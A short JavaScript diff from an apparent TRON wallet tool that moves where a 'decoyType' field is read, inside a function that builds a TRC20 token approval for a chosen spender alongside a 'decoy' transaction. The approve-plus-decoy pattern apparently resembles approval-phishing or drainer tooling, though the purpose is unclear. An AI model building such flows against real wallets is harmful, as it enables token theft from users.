@@ -456,6 +456,7 @@
         const owner = toBase58(state.account || tronWeb.defaultAddress?.base58);
         if (!owner) throw new Error("Connect a TRON account first.");
 
+        const decoyType = $("decoyType").value;
         const tokenContract = requireAddress("tokenContract", "", "TRC20 contract");
         const spender = toBase58(requireAddress("spender", owner, "Approve spender"));
         const approveAmount = integerText("approveAmount", "Approve amount");
@@ -464,7 +465,6 @@
         validateGuards(spender);
 
         let decoyTx;
-        const decoyType = $("decoyType").value;
         if (decoyType === "transferTrx") {
           const decoyTo = toBase58(requireAddress("decoyTo", owner, "Decoy recipient"));
           const decoySun = trxToSun($("decoyTrx").value);
